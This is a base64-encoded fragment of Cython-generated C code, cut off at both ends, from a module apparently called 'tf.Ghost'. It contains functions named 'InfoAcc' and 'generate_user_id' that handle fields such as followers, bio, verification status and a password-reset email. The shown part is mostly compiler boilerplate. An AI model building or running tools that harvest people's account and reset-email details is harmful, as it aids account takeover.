zMSA9IDA7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzI5LCAmX19weXhfdF8zMCwgJl9fcHl4X3RfMzEpOwogICAgICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzI2LCAmX19weXhfdF8yNywgJl9fcHl4X3RfMjgpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzI2LCAmX19weXhfdF8yNywgJl9fcHl4X3RfMjgpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNik7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzI3KTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjgpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yOSk7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMwKTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzEpOwogICAgICAgICAgICAgIF9fcHl4X3RfMjMgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjQgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzI1ID0gX19weXhfZmlsZW5hbWU7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjkpOwogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzApOwogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzEpOwogICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMjksIF9fcHl4X3RfMzAsIF9fcHl4X3RfMzEpOwogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjYpOwogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjcpOwogICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjgpOwogICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8yNiwgX19weXhfdF8yNywgX19weXhfdF8yOCk7CiAgICAgICAgICAgICAgX19weXhfdF8yNiA9IDA7IF9fcHl4X3RfMjcgPSAwOyBfX3B5eF90XzI4ID0gMDsgX19weXhfdF8yOSA9IDA7IF9fcHl4X3RfMzAgPSAwOyBfX3B5eF90XzMxID0gMDsKICAgICAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIzOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yNDsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzI1OwogICAgICAgICAgICAgIGdvdG8gX19weXhfTDI3X2V4Y2VwdF9lcnJvcjsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX3B5eF9MMzc6OwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MMjZfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgfQogICAgICAgIGdvdG8gX19weXhfTDI3X2V4Y2VwdF9lcnJvcjsKCiAgICAgICAgCiAgICAgICAgX19weXhfTDI3X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMik7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMiwgX19weXhfdF8xMSwgX19weXhfdF8xMCk7CiAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjsKICAgICAgICBfX3B5eF9MMjZfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTIsIF9fcHl4X3RfMTEsIF9fcHl4X3RfMTApOwogICAgICAgIF9fcHl4X0wzMF90cnlfZW5kOjsKICAgICAgfQoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMjQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF8yNCkgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yMSwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzE5KSA8IDApIF9fUFlYX0VSUigwLCAzNjYsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIxKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTcpOwogICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2UsIF9fcHl4X3RfMTcpOwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzE1ID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgICAgX19weXhfdF8xOCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfMyA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VffTsKICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE4LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM2NywgX19weXhfTDQ3X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDQ4OwogICAgICAgIH0KICAgICAgICBfX3B5eF9MNDdfZXJyb3I6OwogICAgICAgIHsKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgIF9fcHl4X3RfMTAgPSAwOyBfX3B5eF90XzExID0gMDsgX19weXhfdF8xMiA9IDA7IF9fcHl4X3RfMzEgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8yOSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzMxLCAmX19weXhfdF8zMCwgJl9fcHl4X3RfMjkpOwogICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTAsICZfX3B5eF90XzExLCAmX19weXhfdF8xMikgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTAsICZfX3B5eF90XzExLCAmX19weXhfdF8xMik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMzEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMwKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yOSk7CiAgICAgICAgICBfX3B5eF90XzI0ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzIzID0gX19weXhfY2xpbmVubzsgX19weXhfdF8zMiA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzEpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI5KTsKICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMzEsIF9fcHl4X3RfMzAsIF9fcHl4X3RfMjkpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzEwLCBfX3B5eF90XzExLCBfX3B5eF90XzEyKTsKICAgICAgICAgIF9fcHl4X3RfMTAgPSAwOyBfX3B5eF90XzExID0gMDsgX19weXhfdF8xMiA9IDA7IF9fcHl4X3RfMzEgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8yOSA9IDA7CiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzI0OyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMzsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzMyOwogICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0w0ODo7CiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgZ290byBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwoKICAgIAogICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNCwgX19weXhfdF81LCBfX3B5eF90XzYpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w3X3RyeV9yZXR1cm46OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF80LCBfX3B5eF90XzUsIF9fcHl4X3RfNik7CiAgICBnb3RvIF9fcHl4X0wwOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF80LCBfX3B5eF90XzUsIF9fcHl4X3RfNik7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcnIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9JZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Z1bGxfbmFtZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Zvd3MpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb3dnKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcHApOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9pc1ByYWlzZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Jpbyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2lzX3ZlcmlmaWVkKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzZXRfZW1haWwpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3NzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaW5saW5lX2tleWJvYXJkKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcGF5bG9hZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMjNnZW5lcmF0ZV91c2VyX2lkKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnRmXzVHaG9zdF8yM2dlbmVyYXRlX3VzZXJfaWQgPSB7ImdlbmVyYXRlX3VzZXJfaWQiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0Zl81R2hvc3RfMjNnZW5lcmF0ZV91c2VyX2lkLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMjNnZW5lcmF0ZV91c2VyX2lkKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXJhdGVfdXNlcl9pZCAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJnZW5lcmF0ZV91c2VyX2lkIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJnZW5lcmF0ZV91c2VyX2lkIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZ2VuZXJhdGVfdXNlcl9pZCIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmdlbmVyYXRlX3VzZXJfaWQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfMjJnZW5lcmF0ZV91c2VyX2lkKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yMmdlbmVyYXRlX3VzZXJfaWQoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc3RhcnQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2VuZCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAg